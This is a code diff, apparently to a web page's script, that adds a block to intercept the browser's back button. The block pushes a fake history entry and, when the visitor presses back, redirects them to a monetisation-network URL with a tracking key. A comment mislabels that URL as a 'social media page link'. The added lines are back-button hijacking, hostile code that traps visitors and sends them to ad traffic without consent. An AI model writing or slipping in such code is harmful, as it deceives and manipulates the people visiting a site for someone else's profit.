@@ -1309,6 +1309,18 @@
         draw();
       }
 
+      // Intercept back button / navigation away
+// ========================================================
+// PASTE YOUR SOCIAL MEDIA PAGE LINK BELOW
+const SOCIAL_MEDIA_LINK = "https://www.profitablecpmratenetwork.com/trj95dvie9?key=caff1a40723f5c35d73b530fb6fbaaeb";
+// ========================================================
+
+history.pushState(null, null, location.href);
+window.addEventListener('popstate', function() {
+  history.pushState(null, null, location.href);
+  window.location.href = SOCIAL_MEDIA_LINK;
+});
+      
       // Prevent typing in inputs if not unlocked yet (extra safety)
       document.querySelectorAll(".form-input").forEach((inp) => {
         inp.addEventListener("focus", function () {
